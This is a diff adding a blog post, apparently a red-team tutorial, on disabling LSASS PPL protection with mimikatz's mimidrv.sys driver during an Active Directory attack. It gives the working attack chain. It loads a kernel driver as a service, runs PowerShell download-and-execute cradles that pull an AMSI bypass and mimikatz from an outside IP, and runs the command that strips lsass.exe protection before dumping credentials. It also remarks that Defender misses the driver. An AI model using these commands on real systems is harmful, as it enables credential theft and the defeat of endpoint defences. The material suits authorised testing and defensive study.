@@ -1,0 +1,53 @@
+---
+layout: post
+title: Disabling LSA protection with mimidrv.sys
+---
+![](/images/2021-1-1-mimidrv/0.png)
+
+
+During your Active directory attack, once you have elevated your privilege to NT SYSTEM, the first thing we can do is to dump hashes from LSASS but what if the LSASS is protcted.
+
+If LSASS protection is enabled we cannot tamper with the process, if LSASS is marked as Protected Process Light (PPL) then protection is turned on !
+
+PS: You can use a powershell script such as HostRecon.ps1 to find out if protection is enabled.
+
+In this post we will take a look at how we can run mimikatz to do this by the driver MIMIKATZ uses to accomplish this !
+
+```
+mimidrv.sys
+```
+
+First thing to do is to upload the driver file into disk, fortunately, defender does not flag this as malicious !
+
+
+Now we will create as service and load the driver
+
+```
+sc create mimidrv binPath= C:\tmp\mimidrv.sys type= kernel start= demand
+```
+
+Now we will start the service
+
+```
+
+sc start mimidrv
+```
+
+With the driver running, we can instruct it to turn off the LSASS PPL protection.
+
+In order to do that, we will first disable AMSI and load mimikatz (the whole point of this exercise to minimize the number of time we run mimikatz)
+
+```
+Step 1: Start powershell
+Step 2: (New-Object System.Net.WebClient).DownloadString('http://192.168.49.69/AMSI.txt') | IEX
+Step 3: (New-Object System.Net.WebClient).DownloadString('http://192.168.49.69/mimikatz.txt') | IEX
+Step 4: Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`"" 
+
+
+```
+
+![](/images/2021-1-1-mimidrv/1.png)
+
+With the driver running combined with the above command, we have successfully disabled the protection !!
+
+Now we can use any method to dump the lSASS process and download it offline and use tools such as "MIMIKATZ" or "PYPYKATZ" to extract the credentials
